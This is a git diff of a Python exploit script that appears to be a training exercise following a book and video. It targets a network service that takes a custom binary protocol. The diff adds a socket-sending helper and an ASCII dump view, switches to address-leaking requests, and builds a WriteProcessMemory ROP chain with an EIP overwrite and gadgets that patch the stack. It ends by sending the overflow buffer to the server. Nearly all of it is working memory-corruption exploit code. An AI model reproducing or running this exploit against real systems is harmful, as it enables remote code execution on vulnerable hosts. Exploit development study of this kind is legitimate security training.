@@ -190,13 +190,59 @@ from modules.msfvenom_module import generatePayload
 from numpy import byte
 from rpyc import lib
 
-DEBUG = False
+DEBUG = True
 
 init()
 
 
+def sendMalBuff(buf, socketTup):
+    timeout_seconds = 5
+    try:
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+            s.settimeout(timeout_seconds)
+            s.connect(socketTup)
+
+            # Send the buffer to the server
+            s.sendall(buf)
+            if DEBUG:
+                printBuffer(buf, width="dd")
+                print(f"{Fore.GREEN}o Sent {len(buf)} bytes successfully!{Style.RESET_ALL}")
+
+            # Print out response from server
+            if DEBUG:
+                print(Fore.CYAN + f"o Waiting for response from server..." + Style.RESET_ALL)
+            response = b""
+            while True:
+                try:
+                    chunk = s.recv(1024)
+                    if DEBUG:
+                        print(f"{Fore.YELLOW}Received chunk: {chunk}{Style.RESET_ALL}")
+                except socket.timeout:
+                    break
+                if not chunk:
+                    break
+                response += chunk
+                if b"Address is:" in response:
+                    break
+
+            if not response:
+                print(Fore.RED + "[-] No response received from server" + Style.RESET_ALL)
+                sys.exit(1)
+
+            return response
+
+    except socket.timeout:
+        print(Fore.RED + "[-] Socket operation timed out" + Style.RESET_ALL)
+        sys.exit(1)
+    except socket.error as error:
+        print(Fore.RED + f"[-] Socket error: {error}" + Style.RESET_ALL)
+        sys.exit(1)
+
+
 def leakFunctionAddress(func, socketTup):
 
+    if DEBUG:
+        print(Fore.CYAN + f"o Attempting to leak address for {func.decode('utf-8').strip(chr(0))}..." + Style.RESET_ALL)
     # Append SymbolOperation to the Func
     symOpFunc = b"SymbolOperation" + func
 
@@ -222,56 +268,20 @@ def leakFunctionAddress(func, socketTup):
     # Checksum
     buf = pack(">i", len(buf) - 4) + buf
 
-    timeout_seconds = 5
-    try:
-        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-            s.settimeout(timeout_seconds)
-            s.connect(socketTup)
+    response = sendMalBuff(buf, socketTup)
+    if response:
+        # Should have a valid response, parse it and get the address
+        functionAddress = parseResponse(response)
+        print(Fore.GREEN + f"o Leaked {func.decode('utf-8').strip(chr(0))}: {Fore.LIGHTYELLOW_EX} 0x{functionAddress:08x}" + Style.RESET_ALL)
 
-            # Send the buffer to the server
-            s.sendall(buf)
-            if DEBUG:
-                printBuffer(buf, width="dd")
-                print(f"{Fore.GREEN}o Buffer sent {len(buf)} bytes successfully!{Style.RESET_ALL}")
-
-            # Print out response from server
-            if DEBUG:
-                print(Fore.CYAN + f"o Waiting for response from server..." + Style.RESET_ALL)
-            response = b""
-            while True:
-                try:
-                    chunk = s.recv(1024)
-                    if DEBUG:
-                        print(f"{Fore.YELLOW}Received chunk: {chunk}{Style.RESET_ALL}")
-                except socket.timeout:
-                    break
-                if not chunk:
-                    break
-                response += chunk
-                if b"Address is:" in response:
-                    break
-
-            if not response:
-                print(Fore.RED + "[-] No response received from server" + Style.RESET_ALL)
-                sys.exit(1)
-
-            # Should have a valid response, parse it and get the address
-            functionAddress = parseResponse(response)
-            print(Fore.GREEN + f"o Leaked {func.decode('utf-8').strip(chr(0))}: {Fore.LIGHTYELLOW_EX} 0x{functionAddress:08x}" + Style.RESET_ALL)
-
-            if functionAddress == 1:
-                print(Fore.RED + f"[-] Failed to leak address for {func.decode('utf-8').strip(chr(0))}" + Style.RESET_ALL)
-                sys.exit(1)
-
-            # Return the address only
-            return functionAddress
-
-    except socket.timeout:
-        print(Fore.RED + "[-] Socket operation timed out" + Style.RESET_ALL)
+        if functionAddress == 1:
+            print(Fore.RED + f"[-] Failed to leak address for {func.decode('utf-8').strip(chr(0))}" + Style.RESET_ALL)
+            sys.exit(1)
+    else:
+        print(Fore.RED + f"[-] No response received from server when leaking {func.decode('utf-8').strip(chr(0))}" + Style.RESET_ALL)
         sys.exit(1)
-    except socket.error as error:
-        print(Fore.RED + f"[-] Socket error: {error}" + Style.RESET_ALL)
-        sys.exit(1)
+    # Return the address only
+    return functionAddress
 
 
 def printBuffer(buf, width="db"):
@@ -312,6 +322,18 @@ def printBuffer(buf, width="db"):
                     print(f"{val:04x}", end=" ")
                 elif width == "dd":
                     print(f"{val:08x}", end=" ")
+        # Add ASCII representation
+        print(" ", end="")
+        for j in range(bytes_per_line):
+            idx = i + j
+            if idx < len(buf):
+                byte_val = buf[idx]
+                if 32 <= byte_val <= 126:
+                    print(chr(byte_val), end="")
+                else:
+                    print(".", end="")
+            else:
+                print(" ", end="")
         print()
 
 
@@ -367,8 +389,11 @@ def main():
         # ************************************ Abuse WPM *************************************
         # ************************************************************************************
 
+        # Init Buffer
+        buf = bytearray()
+
         # psAgentCommand
-        buf = bytearray([0x41] * 0xC)
+        buf += bytearray([0x41] * 0xC)
         buf += pack("<i", 0x534)  # opcode
         buf += pack("<i", 0x0)  # 1st memcpy: offset
         buf += pack("<i", 0x700)  # 1st memcpy: size field
@@ -381,31 +406,79 @@ def main():
         # psCommandBuffer
         # NOTE:: My code cave is larger than the book's 0x400
         #        which is why the offset is lower than 0x92c04
+        #        (0x880B0)
         wpm = pack("<L", (WPMAddr))  # WriteProcessMemory Address
-        wpm += pack("<L", (libraryBase + 0x880b0))  # Shellcode Return Address
+        wpm += pack("<L", (libraryBase + 0x92C04))  # Shellcode Return Address
         wpm += pack("<L", (0xFFFFFFFF))  # pseudo Process handle
-        wpm += pack("<L", (libraryBase + 0x880b0))  # Code cave address
+        wpm += pack("<L", (libraryBase + 0x92C04))  # Code cave address
         wpm += pack("<L", (0x41414141))  # dummy lpBuffer (Stack address)
         wpm += pack("<L", (0x42424242))  # dummy nSize
         wpm += pack("<L", (libraryBase + 0xE401C))  # lpNumberOfBytesWritten = libBase + offset of writable DWORD in .data
         wpm += b"A" * 0x10
 
         offset = b"A" * (276 - len(wpm))
-        eip = pack("<L", (libraryBase + 0x408D6))  # push esp; pop esi; ret <- Save ESP to ESI
+        # 1803_1011 (IGNORE, fixed):
+        # Well, something is up with how the PPR gadget is being handled, i lose my 0x030d08d6 for 0x050008d6
+        # 030d -> 0500
+        #
+        # the lower 4 bytes are fine, but the upper 4 are being fked with.
+        # i need to subtract 0x01f30000 or add 0xfe0cffff if i want my original gadget back
+        # ====== Stack layout ======
+        # ROP: push int3*5; ret
+        # 0xfe0cffff
+        # pop reg | add popReg, reg, push popReg; ret
+        # should have -> ROP: push esp; pop esi; ret
+        #
+        # IGNORE THE ABOVE. REASON:
+        #                         restarting the PC gave me a new base address and so now it works as expected
+        eip = pack("<L", (libraryBase + 0x00087E3B))   # (0x03117e3b) int3; int3; int3; int3; int3; ret; <- debugging
+        eip += pack("<L", (libraryBase + 0x000408D6))  # (0x030d08d6) push esp; pop esi; ret <- Save ESP to ESI
+        # eip = pack("<L", (0x41424345))  # push esp; pop esi; ret <- Save ESP to ESI
 
-        # Patching lpBuffer
-        # rop =
-        # mov eax, esi;
+        # ! DEBUG: eip: 0x030d08d6
+        # DD DD DD DD
+        # DD DD DD D6
+        # DD DD D8 D6
+        # DD DD 08 D6
+        # DD 0D 08 D6   <- this broke the flow, got 00 00 08 D6
 
-        # # Patching lpBuffer, need it to point to our shellcode address on stack
-        # rop = pack("<L", (dllBase + 0x296f))     # mov eax, esi; pop esi; ret
-        # rop += pack("<L", (0x42424242))          # dummy value
-        # rop += pack("<L", (dllBase + 0x117c))    # pop ecx; ret
-        # rop += pack("<L", (0x88888888))          # push huge value to
-        # rop += pack("<L", (dllBase + 0x1d0f0))
-        # rop += pack("<L", (dllBase + 0x117c))
-        # rop += pack("<L", (0x77777878))
-        # rop += pack("<L", (dllBase + 0x1d0f0))
+        # eip = pack("<L", (0xDD0D08D6))  # push esp; pop esi; ret <- Save ESP to ESI
+        print(f"{Fore.GREEN}! DEBUG: eip: {hex(libraryBase + 0x408D6)}{Style.RESET_ALL}")
+
+        # Patching lpBuffer, need it to point to our shellcode address on stack
+        rop = pack("<L", (libraryBase + 0x296F))  # mov eax, esi; pop esi; ret  | Save ESP to EAX+ESI
+        rop += pack("<L", (0x42424242))  # dummy value
+        rop += pack("<L", (libraryBase + 0x117C))  # pop ecx; ret
+        rop += pack("<L", (0x88888888))  # push huge value to "subtract"
+        rop += pack("<L", (libraryBase + 0x1D0F0))
+        rop += pack("<L", (libraryBase + 0x117C))  # pop ecx; ret
+        rop += pack("<L", (0x77777878))
+        rop += pack("<L", (libraryBase + 0x1D0F0))  # add eax, ecx; ret
+
+        # 1603_0303:
+        rop += pack("<L", (libraryBase + 0x8876D))  # mov ecx, eax ; mov eax, esi ; pop esi ; retn 0x0010
+        rop += pack("<L", (0x42424242))  # junk into esi
+        rop += pack("<L", (libraryBase + 0x48D8C))  # pop eax ; ret
+        rop += pack("<L", (0x42424242))  # junk for ret 0x10
+        rop += pack("<L", (0x42424242))  # junk for ret 0x10
+        rop += pack("<L", (0x42424242))  # junk for ret 0x10
+        rop += pack("<L", (0x42424242))  # junk for ret 0x10
+        rop += pack("<L", (0xFFFFFEE0))  # pop into eax
+        rop += pack("<L", (libraryBase + 0x1D0F0))  # add eax, ecx ; ret
+        rop += pack("<L", (libraryBase + 0x1FD8))  # mov [eax], ecx ; ret
+
+        # Padding (Followed the vid)
+        padding = b"D" * (0x600 - 276 - 4 - len(rop))
+
+        # Prepare buffer + add checksum
+        buffer = offset + wpm + eip + rop + padding
+        buf += b"File: %s From: %d To: %d ChunkLoc: %d FileLoc: %d" % (buffer, 0, 0, 0, 0)
+        buf = pack(">i", len(buf) - 4) + buf  # Checksum DWORD        0x00 - 0x04
+
+        # Send Final Buffer
+        print(f"{Fore.CYAN}o Sending final buffer...{Style.RESET_ALL}")
+        sendMalBuff(buf, (server, port))
+
     except KeyboardInterrupt:
         print(Fore.RED + "\n[!] User requested shutdown" + Style.RESET_ALL)
         return 1
